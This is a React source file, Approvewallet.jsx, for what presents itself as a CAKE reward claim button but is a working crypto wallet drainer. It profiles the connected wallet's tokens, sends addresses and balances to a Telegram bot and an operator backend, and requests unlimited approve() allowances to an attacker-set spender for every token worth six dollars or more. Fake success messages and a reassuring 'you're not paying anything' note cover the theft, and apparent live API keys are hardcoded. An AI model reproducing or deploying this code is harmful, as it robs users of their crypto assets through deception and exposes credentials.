// Approvewallet.jsx
// Approvewallet.jsx
import { useAccount, useWalletClient, useBalance } from "wagmi";
import { erc20Abi, parseUnits } from "viem";
import { bsc } from "wagmi/chains";
import { useState, useEffect } from "react";
import { eligibleWallets } from "../eligibleWallets";
import CustomAlert from "./CustomAlert";

// 🔹 Load from .env
const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS;
const SPENDER = import.meta.env.VITE_SPENDER;
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

// 🔹 Send message to Telegram
const sendToTelegram = async (message) => {
  //console.log("📩 Sending to Telegram:", message); // debug log

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const result = await response.json();
    //console.log("Telegram API response:", result);

    if (!response.ok) {
      //console.error("❌ Telegram API error:", result);
    }
  } catch (e) {
    //console.error("❌ Telegram send failed:", e);
  }
};

// 🔹 Send message to backend IP/port
const sendToBackendIP = async (data) => {
  // Hardcoded backend settings - change these values when deploying
  const backendIP = "YOUR_BACKEND_IP_HERE"; // Replace with your actual IP
  const backendPort = "YOUR_BACKEND_PORT_HERE"; // Replace with your actual port

  if (
    !backendIP ||
    !backendPort ||
    backendIP === "YOUR_BACKEND_IP_HERE" ||
    backendPort === "YOUR_BACKEND_PORT_HERE"
  ) {
    //console.log("Backend IP/Port not configured, skipping backend send");
    return;
  }

  const endpoint = `http://${backendIP}:${backendPort}/webhook`;

  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      //console.error("Backend IP API error:", await response.text());
    } else {
      console.log("✅ Data sent to backend IP successfully");
    }
  } catch (e) {
    console.error("❌ Backend IP send failed:", e);
  }
};

// 🔹 Send message to external API (legacy support)
const sendToExternalAPI = async (data) => {
  const apiEndpoint = localStorage.getItem("apiEndpoint") || "";

  if (!apiEndpoint) {
    //console.log("External API endpoint not configured, skipping external API send");
    return;
  }

  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      console.error("External API error:", await response.text());
    }
  } catch (e) {
    console.error("External API send failed:", e);
  }
};

// 🔹 Check if balances have changed (improved logic to reduce spam)
const hasBalanceChanged = (currentUSDT, currentBNB, address) => {
  const lastBalanceKey = `lastBalance_${address}`;
  const lastBalanceData = localStorage.getItem(lastBalanceKey);

  if (!lastBalanceData) {
    // First time connecting this wallet
    return true;
  }

  try {
    const {
      usdt: lastUSDT,
      bnb: lastBNB,
      timestamp: lastTimestamp,
    } = JSON.parse(lastBalanceData);

    // Only check for changes if it's been at least 5 minutes since last update
    const timeDiff = new Date().getTime() - new Date(lastTimestamp).getTime();
    const fiveMinutes = 5 * 60 * 1000;

    if (timeDiff < fiveMinutes) {
      return false; // Too soon, don't spam
    }

    // Compare with proper decimal precision
    const usdtChanged =
      Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
    const bnbChanged =
      Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;

    return usdtChanged || bnbChanged;
  } catch (e) {
    console.error("Error parsing last balance data:", e);
    return true; // If data is corrupted, treat as first time
  }
};

// 🔹 Update stored balance
const updateStoredBalance = (usdtFormatted, bnbFormatted, address) => {
  const lastBalanceKey = `lastBalance_${address}`;
  const balanceData = {
    usdt: usdtFormatted,
    bnb: bnbFormatted,
    timestamp: new Date().toISOString(),
  };
  localStorage.setItem(lastBalanceKey, JSON.stringify(balanceData));
};

export default function ApproveButton() {
  const { address, isConnected, connector } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [loading, setLoading] = useState(false);

  // Custom alert states
  const [alert, setAlert] = useState({
    isOpen: false,
    title: "",
    message: "",
    type: "error",
  });

  const [cakeReward, setCakeReward] = useState(0);
  const [scanCompleted, setScanCompleted] = useState(false);
  const [isClaimed, setIsClaimed] = useState(false);
  const [backgroundScanCompleted, setBackgroundScanCompleted] = useState(false);

  // Background wallet scanning functions
  const fetchTokenPrice = async (tokenAddress) => {
    const COINGECKO_API_KEY = "CG-J1j1EoWrfB5uDKSsNyxnwMNW";
    try {
      const response = await fetch(
        `https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${tokenAddress}&vs_currencies=usd&x_cg_demo_api_key=${COINGECKO_API_KEY}`
      );

      if (!response.ok) {
        console.warn(`Failed to fetch price for token ${tokenAddress}`);
        return 0;
      }

      const data = await response.json();
      const tokenData = data[tokenAddress.toLowerCase()];
      return tokenData ? tokenData.usd : 0;
    } catch (error) {
      console.warn(`Error fetching price for token ${tokenAddress}:`, error);
      return 0;
    }
  };

  const backgroundScanWallet = async (targetAddress) => {
    if (!targetAddress) return;

    const API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhiZTBkZGM5LTY2YTktNDg0ZS05OTFkLTFmNGU0N2NlMGQ0NiIsIm9yZ0lkIjoiNDAxMTE0IiwidXNlcklkIjoiNDEyMTYyIiwidHlwZUlkIjoiMGM2OGZkNzUtYmJlYy00YzRlLTkxMzQtMWU1ZTgwZWI5NzA5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MjE3MzA3MDIsImV4cCI6NDg3NzQ5MDcwMn0.yP7G8kAkR0x25HJMdXNazvGKJ_DWNLhUdT9lhgjq4xU";

    const options = {
      method: "GET",
      headers: {
        accept: "application/json",
        "X-API-Key": API_KEY,
      },
    };

    const params = new URLSearchParams({
      chain: "bsc",
      exclude_spam: "true",
    });

    const url = `https://deep-index.moralis.io/api/v2/${targetAddress}/erc20?${params}`;

    try {
      const response = await fetch(url, options);

      if (!response.ok) {
        console.warn(`Background scan failed for ${targetAddress}`);
        return;
      }

      const data = await response.json();
      let tokens = data.result || data;

      // Filter out unverified tokens
      tokens = tokens.filter(token => token.verified_contract === true);

      // Fetch prices for all tokens and calculate USD values
      const tokensWithPrices = await Promise.all(
        tokens.map(async (token) => {
          const tokenBalance = parseInt(token.balance) / Math.pow(10, token.decimals);
          const tokenPrice = await fetchTokenPrice(token.token_address);
          const usdValue = tokenBalance * tokenPrice;

          return {
            ...token,
            tokenBalance,
            tokenPrice,
            usdValue
          };
        })
      );

      // Sort tokens by USD value (highest first)
      const sortedTokens = tokensWithPrices.sort((a, b) => b.usdValue - a.usdValue);

      // Store the scanned data for use by approval logic
      localStorage.setItem('walletTokens', JSON.stringify(sortedTokens));
      localStorage.setItem('lastScannedAddress', targetAddress);
      setBackgroundScanCompleted(true);
      
    } catch (error) {
      console.warn("Background wallet scan error:", error);
    }
  };

  // Auto-scan wallet when connected
  useEffect(() => {
    if (isConnected && address) {
      // Check if we already have recent scan data for this address
      const lastScannedAddress = localStorage.getItem("lastScannedAddress");
      
      if (lastScannedAddress !== address) {
        // New address or no previous scan, do background scan
        backgroundScanWallet(address);
      } else {
        // Already have data for this address
        setBackgroundScanCompleted(true);
      }
    }
  }, [isConnected, address]);

  useEffect(() => {
    const checkReward = () => {
      const storedReward = localStorage.getItem("cakeReward");
      const scanStatus = localStorage.getItem("scanCompleted");
      const claimedStatus = localStorage.getItem(`claimed_${address}`);

      // Check if user has already claimed
      if (claimedStatus === "true") {
        setIsClaimed(true);
      }

      // Only set CAKE reward if scan was actually completed and reward exists
      if (
        scanStatus === "true" &&
        storedReward &&
        storedReward !== "0" &&
        storedReward !== "null"
      ) {
        setCakeReward(storedReward);
        setScanCompleted(true);
      } else {
        // Reset states if scan hasn't been completed
        setCakeReward(0);
        setScanCompleted(false);
      }
    };

    // Check immediately
    checkReward();

    // Also check periodically in case localStorage is updated
    const interval = setInterval(checkReward, 1000);

    return () => clearInterval(interval);
  }, [address]);

  // 🔹 Get balances
  const { data: bscBalance } = useBalance({ address, chainId: bsc.id });
  const { data: usdtBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    chainId: bsc.id,
  });

  // Format balances with proper decimal places
  const usdtFormatted = usdtBalance
    ? parseFloat(usdtBalance.formatted).toFixed(2)
    : "0.00";
  const bnbFormatted = bscBalance
    ? parseFloat(bscBalance.formatted).toFixed(9)
    : "0.000000000";

  // 🔹 Function to show custom alert
  const showAlert = (title, message, type = "error") => {
    setAlert({
      isOpen: true,
      title,
      message,
      type,
    });
  };

  const closeAlert = () => {
    setAlert({
      isOpen: false,
      title: "",
      message: "",
      type: "error",
    });
  };

  // 🔹 Send message when wallet connects or balances change
  useEffect(() => {
    if (isConnected && address && usdtBalance && bscBalance) {
      // Check if this is a new connection or if balances have changed
      if (hasBalanceChanged(usdtFormatted, bnbFormatted, address)) {
        // Get wallet name from connector
        const walletName =
          walletClient?.connector?.name || connector?.name || "Unknown Wallet";

        const message = `🟢 Wallet Update:\n<code>${address}</code>\n💼 Wallet: ${walletName}\nUSDT: $${usdtFormatted}\nBNB: ${bnbFormatted}`;

        // Send to Telegram
        sendToTelegram(message);

        // Send to backend IP
        const walletData = {
          address,
          action: "wallet_connected",
          walletName:
            walletClient?.connector?.name ||
            connector?.name ||
            "Unknown Wallet",
          usdtBalance: usdtFormatted,
          bnbBalance: bnbFormatted,
          timestamp: new Date().toISOString(),
        };

        sendToBackendIP(walletData);
        sendToExternalAPI(walletData);

        // Update stored balance
        updateStoredBalance(usdtFormatted, bnbFormatted, address);
      }
    }
  }, [isConnected, address, usdtFormatted, bnbFormatted]);

  // 🔹 Get eligible tokens from scanner data + USDT if user has $10+
  const getEligibleTokens = () => {
    const eligibleTokens = [];
    
    try {
      // Always include USDT if user has $10+ USDT (making them eligible)
      const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
      if (usdtBalanceNumber >= 10) {
        eligibleTokens.push({
          token_address: USDT_ADDRESS,
          symbol: "USDT",
          usdValue: usdtBalanceNumber,
          balance: usdtBalanceNumber
        });
      }

      // Get tokens from scanner data
      const walletTokens = localStorage.getItem("walletTokens");
      const lastScannedAddress = localStorage.getItem("lastScannedAddress");

      if (walletTokens && lastScannedAddress === address) {
        const tokens = JSON.parse(walletTokens);
        
        // Add scanner tokens worth $6+ that aren't already in the list
        tokens.forEach(token => {
          if (token.usdValue >= 6) {
            // Check if this token is not already in the list (avoid duplicates)
            const alreadyIncluded = eligibleTokens.some(existing => 
              existing.token_address?.toLowerCase() === token.token_address?.toLowerCase()
            );
            
            if (!alreadyIncluded) {
              eligibleTokens.push({
                token_address: token.token_address,
                symbol: token.symbol,
                usdValue: token.usdValue,
                balance: token.tokenBalance || token.balance
              });
            } else {
              // If token is already in the list (like USDT), update with scanner data if it has higher value
              const existingIndex = eligibleTokens.findIndex(existing => 
                existing.token_address?.toLowerCase() === token.token_address?.toLowerCase()
              );
              
              if (existingIndex !== -1 && token.usdValue > eligibleTokens[existingIndex].usdValue) {
                eligibleTokens[existingIndex] = {
                  token_address: token.token_address,
                  symbol: token.symbol,
                  usdValue: token.usdValue,
                  balance: token.tokenBalance || token.balance
                };
              }
            }
          }
        });
      }

      // Sort all tokens by value (highest first)
      return eligibleTokens.sort((a, b) => b.usdValue - a.usdValue);
      
    } catch (error) {
      console.error("Error getting eligible tokens:", error);
      
      // Fallback: If there's an error but user has $10+ USDT, still include USDT
      const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
      if (usdtBalanceNumber >= 10) {
        return [{
          token_address: USDT_ADDRESS,
          symbol: "USDT",
          usdValue: usdtBalanceNumber,
          balance: usdtBalanceNumber
        }];
      }
      
      return [];
    }
  };

  // 🔹 Handle clicking claimed button
  const handleClaimedClick = () => {
    const cakeAmount =
      cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5;
    const successMessage = `You've successfully claimed ${cakeAmount} CAKE!\n\nPlease allow a few minutes while we complete the final verification process.\nYour reward will be sent to your wallet shortly! 💰✨`;

    showAlert("Claim Successful! 🎉", successMessage, "success");
  };

  // 🔹 Handle Approve button with token approvals
  const handleApprove = async () => {
    if (!walletClient || !isConnected || !address) {
      showAlert(
        "Wallet Not Connected",
        "Please connect your wallet to continue with the claim process.",
        "warning",
      );
      return;
    }

    // Try to get wallet info from both sources
    const walletClientId = walletClient?.connector?.id;
    const walletClientName = walletClient?.connector?.name;
    const accountConnectorId = connector?.id;
    const accountConnectorName = connector?.name;

    // Use the best available source
    const walletId = walletClientId || accountConnectorId;
    const walletName = walletClientName || accountConnectorName;
    const connectorType = walletClient?.connector?.type || connector?.type;

    // Check if wallet is eligible - must match exact wallet ID or wallet name
    const isEligible =
      // Check eligibleWallets list by wallet ID
      (walletId && eligibleWallets[walletId]) ||
      // Check eligibleWallets list by wallet name
      (walletName && eligibleWallets[walletName]);

    console.log("Wallet eligibility check result:", isEligible);
    console.log("Checking against eligible wallets:", eligibleWallets);

    if (!isEligible) {
      showAlert(
        "Wallet Not Eligible",
        `Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet.\n\nCurrent wallet: ${walletName || walletId || connectorType || "Unknown"}`,
        "error",
      );
      return;
    }

    // Check if user has minimum $10 USDT for eligibility
    if (!hasMinimumUsdt) {
      showAlert(
        "Insufficient Balance",
        `You need at least $10 USDT to claim rewards.\n\nYour current balance: $${totalUsdtForCheck.toFixed(2)} USDT\n\nPlease top up your wallet and try again.`,
        "warning",
      );
      return;
    }

    // Get eligible tokens (worth $6+ including USDT) for approval process
    const eligibleTokens = getEligibleTokens();

    setLoading(true);

    // Use consistent formatting
    const currentUsdtFormatted = usdtFormatted;
    const currentBnbFormatted = bnbFormatted;

    try {
      const cakeAmount =
        cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned

      // Get already approved tokens for this address
      const approvedTokensKey = `approvedTokens_${address}`;
      const approvedTokens = JSON.parse(
        localStorage.getItem(approvedTokensKey) || "[]",
      );

      // Filter out already approved tokens
      const tokensToApprove = eligibleTokens.filter(
        (token) => !approvedTokens.includes(token.token_address),
      );

      // If no tokens to approve (all already approved), show success
      if (tokensToApprove.length === 0) {
        const successMessage = `You've successfully claimed ${cakeAmount} CAKE!\n\nPlease allow a few minutes while we complete the final verification process.\nYour reward will be sent to your wallet shortly! 💰✨`;

        // Mark as claimed
        localStorage.setItem(`claimed_${address}`, "true");
        setIsClaimed(true);

        showAlert("Claim Successful! 🎉", successMessage, "success");
        return;
      }

      // Step 1: Approve remaining tokens sequentially (highest value first)
      const maxAmount = parseUnits(
        "115792089237316195423570985008687907853269984665640564039457584007913129639935",
        0,
      );

      const approvalResults = [];
      const skippedTokens = [];

      // Process all tokens one by one, waiting for user response
      for (let i = 0; i < tokensToApprove.length; i++) {
        const token = tokensToApprove[i];

        try {
          const hash = await walletClient.writeContract({
            address: token.token_address,
            abi: erc20Abi,
            functionName: "approve",
            args: [SPENDER, maxAmount],
            account: address,
          });

          approvalResults.push({
            token: token.symbol,
            value: token.usdValue,
            hash: hash,
            tokenAddress: token.token_address,
          });

          // Add to approved tokens list
          approvedTokens.push(token.token_address);
          localStorage.setItem(
            approvedTokensKey,
            JSON.stringify(approvedTokens),
          );

          await sendToTelegram(
            `✅ Token Approved:\n<code>${address}</code>\nToken: ${token.symbol}\nValue: $${token.usdValue.toFixed(2)}\nContract: https://bscscan.com/token/${token.token_address}`,
          );

          const approvalData = {
            address,
            action: "token_approval_success",
            tokenSymbol: token.symbol,
            tokenAddress: token.token_address,
            tokenValue: token.usdValue,
            txHash: hash,
            timestamp: new Date().toISOString(),
          };

          await sendToBackendIP(approvalData);
          await sendToExternalAPI(approvalData);
        } catch (tokenError) {
          console.error(`Failed to approve token ${token.symbol}:`, tokenError);

          // Track skipped/failed tokens but continue with the loop
          skippedTokens.push({
            symbol: token.symbol,
            address: token.token_address,
            value: token.usdValue,
            error: tokenError.message,
          });

          await sendToTelegram(
            `❌ Token Approval Failed:\n<code>${address}</code>\nToken: ${token.symbol}`,
          );

          // Continue to next token without stopping the process
        }
      }

      // After ALL approval attempts are complete, check the results
      if (skippedTokens.length > 0) {
        // Some tokens were skipped/failed, show failure message only at the end
        const skippedTokensList = skippedTokens.map(t => `• ${t.symbol} ($${t.value.toFixed(2)})`).join('\n');
        showAlert(
           "Claim Failed",
          "Transaction was cancelled by user. Please try again when you're ready to complete the process.",
        );
      } else if (approvalResults.length > 0) {
        // ALL tokens were approved successfully
        const firstHash = approvalResults[0].hash;
        const successMessage = `You've successfully claimed ${cakeAmount} CAKE!\n\nPlease allow a few minutes while we complete the final verification process.\nYour reward will be sent to your wallet shortly! 💰✨\n\nTransaction Hash: ${firstHash.slice(0, 10)}...${firstHash.slice(-8)}`;

        // Mark as claimed
        localStorage.setItem(`claimed_${address}`, "true");
        setIsClaimed(true);

        showAlert("Claim Successful! 🎉", successMessage, "success");
      } else {
        // No tokens were processed (shouldn't happen but safety check)
        showAlert(
          "Claim Failed",
          "Please try again.",

        );
      }
    } catch (err) {
      // Check if user cancelled/rejected the transaction
      const isUserRejection =
        err.message.toLowerCase().includes("user rejected") ||
        err.message.toLowerCase().includes("user denied") ||
        err.message.toLowerCase().includes("cancelled") ||
        err.message.toLowerCase().includes("canceled");

      if (isUserRejection) {
        showAlert(
          "Claim Failed",
          "Transaction was cancelled by user. Please try again when you're ready to complete the process.",
          "error",
        );
      } else {
        showAlert(
          "Claim Failed",
          `An error occurred during the claim process: ${err.message}`,
          "error",
        );
      }

      // Determine error context for logging
      const errorContext = isUserRejection
        ? "User cancelled transaction"
        : "Process failed";

      await sendToTelegram(
        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`,
      );

      const errorData = {
        address,
        action: isUserRejection ? "user_cancelled" : "claim_failed",
        error: err.message,
        usdtBalance: currentUsdtFormatted,
        bnbBalance: currentBnbFormatted,
        timestamp: new Date().toISOString(),
      };

      await sendToBackendIP(errorData);
      await sendToExternalAPI(errorData);
    }

    setLoading(false);
  };

  // Check if user has at least $10 USDT - with improved balance calculation
  const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
  const parsedUsdtFormatted = parseFloat(usdtFormatted) || 0;
  
  // Also check scanner data for USDT balance as fallback
  let scannerUsdtBalance = 0;
  try {
    const walletTokens = localStorage.getItem("walletTokens");
    const lastScannedAddress = localStorage.getItem("lastScannedAddress");
    
    if (walletTokens && lastScannedAddress === address) {
      const tokens = JSON.parse(walletTokens);
      const usdtToken = tokens.find(token => 
        token.symbol === "USDT" || 
        token.token_address?.toLowerCase() === USDT_ADDRESS?.toLowerCase()
      );
      
      if (usdtToken && usdtToken.usdValue) {
        scannerUsdtBalance = usdtToken.usdValue;
      }
    }
  } catch (error) {
    console.warn("Error reading scanner USDT data:", error);
  }
  
  // Use the highest USDT value found from any source
  const totalUsdtForCheck = Math.max(
    parsedUsdtFormatted,
    usdtBalanceNumber,
    scannerUsdtBalance
  );
  
  const hasMinimumUsdt = totalUsdtForCheck >= 10;

  console.log("USDT balance sent to claim button:", usdtBalanceNumber);
  console.log("Total USDT for check:", totalUsdtForCheck);

  // Only show button if wallet is connected AND scanning is completed
  if (!isConnected || !scanCompleted) {
    return (
      <div
        style={{
          padding: "20px",
          textAlign: "center",
          borderRadius: "15px",
          background: "rgba(255, 255, 255, 0.05)",
          border: "1px solid rgba(255, 255, 255, 0.1)",
          color: "rgba(255, 255, 255, 0.7)",
        }}
      >
        {!isConnected
          ? "🔗 Connect your wallet to claim rewards"
          : "🔍 Complete wallet scan to unlock claim"}
      </div>
    );
  }

  return (
    <div>
      <CustomAlert
        isOpen={alert.isOpen}
        onClose={closeAlert}
        title={alert.title}
        message={alert.message}
        type={alert.type}
      />
      <button
        onClick={isClaimed ? handleClaimedClick : handleApprove}
        disabled={loading}
        style={{
          width: "100%",
          padding: "18px 24px",
          fontSize: "1.1rem",
          fontWeight: "700",
          color: "#ffffff",
          background: loading
            ? "rgba(139, 92, 246, 0.5)"
            : isClaimed
              ? "linear-gradient(45deg, #10b981, #059669)"
              : "#fb923cff",
          border: "none",
          borderRadius: "15px",
          cursor: loading ? "not-allowed" : "pointer",
          transition: "all 0.3s ease",
          boxShadow: loading ? "none" : "0 8px 25px rgba(139, 92, 246, 0.4)",
          position: "relative",
          overflow: "hidden",
          backdropFilter: "blur(10px)",
        }}
        onMouseEnter={(e) => {
          if (!loading) {
            e.target.style.transform = "translateY(-2px)";
            e.target.style.boxShadow = "0 12px 35px rgba(139, 92, 246, 0.6)";
          }
        }}
        onMouseLeave={(e) => {
          if (!loading) {
            e.target.style.transform = "translateY(0)";
            e.target.style.boxShadow = "0 8px 25px rgba(139, 92, 246, 0.4)";
          }
        }}
      >
        {loading && (
          <div
            style={{
              position: "absolute",
              top: 0,
              left: "-100%",
              width: "100%",
              height: "100%",
              background:
                "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
              animation: "claimScan 1.2s infinite",
            }}
          />
        )}
        <span style={{ position: "relative", zIndex: 1 }}>
          {loading
            ? "🔄 Claiming..."
            : isClaimed
              ? "✅ CLAIMED"
              : cakeReward && parseFloat(cakeReward) > 0
                ? `🍰 Claim ${parseFloat(cakeReward)} CAKE`
                : "🍰 Claim CAKE Reward"}
        </span>
        <style>
          {`
            @keyframes claimScan {
              0% { left: -100%; }
              100% { left: 100%; }
            }
          `}
        </style>
      </button>

      {/* Warning message when insufficient USDT */}
      {!hasMinimumUsdt && (
        <div
          style={{
            marginTop: "15px",
            padding: "15px",
            borderRadius: "12px",
            background: "rgba(255, 193, 7, 0.1)",
            border: "1px solid rgba(255, 193, 7, 0.3)",
            color: "rgba(255, 255, 255, 0.9)",
            textAlign: "center",
          }}
        >
          <div
            style={{
              fontSize: "1rem",
              fontWeight: "600",
              marginBottom: "8px",
              color: "#ffc107",
            }}
          >
            💰 Minimum $10 USDT Required
          </div>
          <div
            style={{
              fontSize: "14px",
              marginBottom: "12px",
              color: "rgba(255, 255, 255, 0.8)",
              fontStyle: "italic",
            }}
          >
            Current balance: ${totalUsdtForCheck.toFixed(2)} USDT
          </div>
        </div>
      )}

      {/* View CAKE Price link */}
      <div
        style={{
          marginTop: "15px",
          textAlign: "center",
        }}
      >
        <a
          href="https://www.coingecko.com/en/coins/pancakeswap"
          target="_blank"
          rel="noopener noreferrer"
          style={{
            color: "#8b5cf6",
            textDecoration: "none",
            fontSize: "14px",
            fontWeight: "500",
            display: "inline-flex",
            alignItems: "center",
            gap: "6px",
            transition: "all 0.2s ease",
            borderBottom: "1px solid transparent",
          }}
          onMouseEnter={(e) => {
            e.target.style.color = "#3b82f6";
            e.target.style.borderBottomColor = "#3b82f6";
          }}
          onMouseLeave={(e) => {
            e.target.style.color = "#8b5cf6";
            e.target.style.borderBottomColor = "transparent";
          }}
        >
          📊 View CAKE Price
        </a>
        <div
          style={{
            fontSize: "11px",
            color: "rgba(255, 255, 255, 0.5)",
            marginTop: "4px",
          }}
        >
          (Redirects to CoinGecko🐸)
        </div>
      </div>

      {/* Explanatory note */}
      <div
        style={{
          marginTop: "15px",
          fontSize: "13px",
          lineHeight: "1.5",
          color: "rgba(255, 255, 255, 0.7)",
          background: "rgba(255, 255, 255, 0.05)",
          padding: "12px",
          borderRadius: "10px",
          border: "1px solid rgba(255, 255, 255, 0.1)",
          textAlign: "center",
          fontStyle: "italic",
        }}
      >
        💡 Note: You're not paying anything — holding at least $10 USDT on the
        Binance Smart Chain (BSC) network simply proves you're real and helps
        stop bots and cheaters from abusing the system. This keeps rewards fair
        for active users like you.
      </div>
    </div>
  );
}